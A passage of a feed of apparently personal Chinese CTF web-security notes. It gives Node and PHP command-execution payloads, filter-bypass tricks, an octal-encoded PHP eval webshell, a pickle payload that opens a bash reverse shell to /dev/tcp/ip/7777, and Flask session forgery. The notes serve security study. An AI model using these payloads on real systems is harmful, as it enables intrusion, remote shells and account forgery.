&lt;/code>&lt;/pre>&lt;p>等待目标上线&lt;/p></description></item><item><title>node 原型链污染</title><link>http://localhost:1313/docs/network-security/node/%E5%8E%9F%E5%BD%A2%E9%93%BE%E6%B1%A1%E6%9F%93/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/node/%E5%8E%9F%E5%BD%A2%E9%93%BE%E6%B1%A1%E6%9F%93/</guid><description>&lt;h2 id="命令执行">
 命令执行
 &lt;a class="anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c">#&lt;/a>
&lt;/h2>
&lt;p>常用&lt;/p>
&lt;pre tabindex="0">&lt;code>require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;ls&amp;#39;)
require(&amp;#39;child_process&amp;#39;).spawnSync(&amp;#39;cat&amp;#39;,[&amp;#39;/flag&amp;#39;]).output
global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;dir&amp;#39;)
&lt;/code>&lt;/pre></description></item><item><title>php</title><link>http://localhost:1313/docs/network-security/php/php/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php/</guid><description>&lt;h2 id="zip">
 Zip
 &lt;a class="anchor" href="#zip">#&lt;/a>
&lt;/h2>
&lt;h4 id="利用-ziparchive-内置类的open方法达到删除文件效果">
 利用 ZipArchive 内置类的open方法达到删除文件效果
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8-ziparchive-%e5%86%85%e7%bd%ae%e7%b1%bb%e7%9a%84open%e6%96%b9%e6%b3%95%e8%be%be%e5%88%b0%e5%88%a0%e9%99%a4%e6%96%87%e4%bb%b6%e6%95%88%e6%9e%9c">#&lt;/a>
&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Jesen&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $filename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;11.php&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $content&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $me;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Jesen&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">me&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ZipArchive&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">serialize&lt;/span>($a);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="base64">
 base64
 &lt;a class="anchor" href="#base64">#&lt;/a>
&lt;/h2>
&lt;p>文件包含过滤了base,用其他编码，不行多试几个&lt;/p>
&lt;pre tabindex="0">&lt;code>UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
...
\\具体支持的编码可见php官方文档
\\https://www.php.net/manual/zh/mbstring.supported-encodings.php
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>php://filter/convert.base64-encode/resource=
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter//convert.iconv.EUC-JP*.UCS-4*/resource=flag.php
&lt;/code>&lt;/pre></description></item><item><title>php</title><link>http://localhost:1313/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;h2 id="反序列化">
 反序列化
 &lt;a class="anchor" href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96">#&lt;/a>
&lt;/h2>
&lt;p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。&lt;/p>
&lt;p>两个函数&lt;/p>
&lt;p>serialize 将对象格式化成有序的字符串&lt;/p>
&lt;p>unserialize 将字符串还原成原来的对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> __construct(){$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;xiaoshizi&amp;#34;&lt;/span>;$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;laoshizi&amp;#34;&lt;/span>;}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">happy&lt;/span>(){&lt;span style="color:#66d9ef">return&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>;}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">serialize&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出&lt;/p>
&lt;pre tabindex="0">&lt;code>O:4:&amp;#34;test&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;xiaoshizi&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:8:&amp;#34;laoshizi&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>序列化后字符串的格式&lt;/p>
&lt;pre tabindex="0">&lt;code>O:4:&amp;#34;对象名&amp;#34;:变量数量:{s:变量名长度:&amp;#34;变量名&amp;#34;;s:变量值长度:&amp;#34;变量值&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:8:&amp;#34;laoshizi&amp;#34;;}
&lt;/code>&lt;/pre>&lt;h2 id="修饰符">
 修饰符
 &lt;a class="anchor" href="#%e4%bf%ae%e9%a5%b0%e7%ac%a6">#&lt;/a>
&lt;/h2>
&lt;p>如果变量前的修饰符是protected或private，先将代码的修饰符改为public进行序列化，再做修改&lt;/p>
&lt;pre tabindex="0">&lt;code>private =&amp;gt;%00class_name%00name 长度+类名长度+2
protected =&amp;gt;%00*%00name 长度+3
&lt;/code>&lt;/pre>&lt;p>php7.1+不敏感&lt;/p>
&lt;p>常见的魔术方法&lt;/p>
&lt;pre tabindex="0">&lt;code>__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
&lt;/code>&lt;/pre>&lt;h2 id="字符串逃逸">
 字符串逃逸
 &lt;a class="anchor" href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%83%e9%80%b8">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">repl&lt;/span>($s){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">str_replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hack!&amp;#39;&lt;/span>, $s);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $user&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $pwd&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$u&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">serialize&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> $u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$b&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">unserialize&lt;/span>($u);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> $b&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$b&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">pwd&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出，没问题&lt;/p></description></item><item><title>php命令执行linux绕过</title><link>http://localhost:1313/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/</guid><description>&lt;p>在php中虽然有命令执行，但是过滤了很多，会让我们的难度变大&lt;/p>
&lt;h2 id="空格">
 空格
 &lt;a class="anchor" href="#%e7%a9%ba%e6%a0%bc">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>${IFS}
$IFS$9
&amp;gt;
&amp;lt;&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="inode">
 inode
 &lt;a class="anchor" href="#inode">#&lt;/a>
&lt;/h2>
&lt;p>打印文件的inode号&lt;/p>
&lt;pre tabindex="0">&lt;code>ls -i
tac `find / -inum incode号`
&lt;/code>&lt;/pre>&lt;p>在获取到inode号配合可以查找文件及所有子目录文件并打印&lt;/p>
&lt;pre tabindex="0">&lt;code>cat `find . -inum inode号`
&lt;/code>&lt;/pre>&lt;p>在linux 会优先执行反引号中的内容&lt;/p>
&lt;h2 id="tee">
 tee
 &lt;a class="anchor" href="#tee">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>欲执行命令 | tee 回显文件
如
l\s / | tee 1.txt

再访问1.txt


关键字被过滤 在中间加\
&lt;/code>&lt;/pre>&lt;h2 id="cat">
 cat
 &lt;a class="anchor" href="#cat">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>cat、tac、more、less、head、tail、nl、sed、sort、uniq
&lt;/code>&lt;/pre>&lt;h2 id="编码">
 编码
 &lt;a class="anchor" href="#%e7%bc%96%e7%a0%81">#&lt;/a>
&lt;/h2>
&lt;p>用base64，解密并执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">bHMgLWwK&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">base64&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;636174202f666c6167&amp;#34;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">xxd&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ascii的八进制编码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>(&lt;span style="color:#a6e22e">printf&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\154\163&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>) &lt;span style="color:#f92672">--&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>(&lt;span style="color:#a6e22e">printf&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#a6e22e">printf&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>}&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">写shell&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>{&lt;span style="color:#a6e22e">printf&lt;/span>,&lt;span style="color:#a6e22e">\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&lt;/span>&lt;span style="color:#e6db74">&amp;#34;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 脚本
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">def encodeOctal(str):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # 只显示八进制
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">八进制&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> for i in str:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(oct(ord(i)).replace(&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#a6e22e">o&lt;/span>&lt;span style="color:#e6db74">&amp;#34;, &amp;#34;&lt;/span>&lt;span style="color:#a6e22e">\\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;), end=&amp;#34;&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # 显示Linux八进制payload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">\nlinux&lt;/span> &lt;span style="color:#a6e22e">payload&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload = &amp;#39;$(printf&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>IFS&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> for i in str:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload += oct(ord(i)).replace(&amp;#34;0o&amp;#34;, &amp;#34;\\&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload += &amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(payload)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">if __name__ == &amp;#39;__main__&amp;#39;:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> str = &amp;#34;&lt;/span>&lt;span style="color:#a6e22e">cat&lt;/span> &lt;span style="color:#a6e22e">flag_1s_here&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">flag_831b69012c67b35f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> encodeOctal(str)
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分隔符&lt;/p></description></item><item><title>pickle反序列化</title><link>http://localhost:1313/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-PYTHON" data-lang="PYTHON">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/python3.6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> pickle
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> base64 &lt;span style="color:#f92672">import&lt;/span> b64encode
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User &lt;span style="color:#f92672">=&lt;/span> type(&lt;span style="color:#e6db74">&amp;#39;User&amp;#39;&lt;/span>, (object,), {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;uname&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;test&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;is_admin&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;__repr__&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">lambda&lt;/span> o: o&lt;span style="color:#f92672">.&lt;/span>uname,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;__reduce__&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">lambda&lt;/span> o: (os&lt;span style="color:#f92672">.&lt;/span>system,(&lt;span style="color:#e6db74">&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/7777 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span>,))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>u &lt;span style="color:#f92672">=&lt;/span> pickle&lt;span style="color:#f92672">.&lt;/span>dumps(User())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(b64encode(u)&lt;span style="color:#f92672">.&lt;/span>decode())
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>python session伪造</title><link>http://localhost:1313/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/</guid><description>&lt;ol>
&lt;li>
&lt;h2 id="session伪造">
 session伪造
 &lt;a class="anchor" href="#session%e4%bc%aa%e9%80%a0">#&lt;/a>
&lt;/h2>
&lt;p>获取SECRET_KEY，一般存放在环境变量中，可通过evs查看，在靶场中可注意查看robots.txt或者通过注入{{config}}查看&lt;/p>
&lt;p>&lt;a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)&lt;/a>&lt;/p>
&lt;p>注意python2和python3生成的是不一样的，win和linux好像也不一样&lt;/p>
&lt;p>在encode时注意包裹要用双引号&lt;/p>
&lt;p>在encode时，要注意是否包含True 或者False 在python要首字母大写，不要写错了&lt;/p>
&lt;p>&lt;del>Ture&lt;/del> =&amp;gt;True&lt;/p>
&lt;p>&lt;del>Flase&lt;/del> =&amp;gt;False&lt;/p>
&lt;p>注意看到key后面的符号有些时候会没有复制到，如！&lt;/p>
&lt;pre tabindex="0">&lt;code>__import__(\&amp;#34;os\&amp;#34;).popen(\&amp;#34;cat flag.txt\&amp;#34;).read()
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>​	encode&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s &amp;#39;.{y]tR&amp;amp;sp&amp;amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&amp;#39; -t &amp;#39;{&amp;#34;number&amp;#34;:&amp;#34;326410031505&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;}&amp;#39;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>decode&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py decode -c &amp;#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoieWVhciJ9.u96oSxNl0euw-9FpcndeiWMoHfMHx55nfrpF8VcpzA8&amp;#39; -s &amp;#39;you-will-never-guess&amp;#39;
&lt;/code>&lt;/pre>&lt;p>没有key就直接-c,但是修改了再加密回去需要知道key才行&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;h2 id="签名伪造">
 签名伪造
 &lt;a class="anchor" href="#%e7%ad%be%e5%90%8d%e4%bc%aa%e9%80%a0">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = b&amp;#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&amp;#39;

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route(&amp;#39;/&amp;#39;)
def index():
 print(session_serializer.dumps(&amp;#34;admin&amp;#34;))

index()
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h2 id="pid伪造">
 PID伪造
 &lt;a class="anchor" href="#pid%e4%bc%aa%e9%80%a0">#&lt;/a>
&lt;/h2>
&lt;/li>
&lt;/ol>
&lt;p>有key，&lt;/p>
&lt;p>mac地址:c2:e8:f4:f8:4f:18&lt;/p>
&lt;pre tabindex="0">&lt;code>cat /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;p>mac地址路径，cookie伪造：https://github.com/noraj/flask-session-cookie-manager&lt;/p></description></item><item><title>readflag</title><link>http://localhost:1313/docs/network-security/php/readflag/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/readflag/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
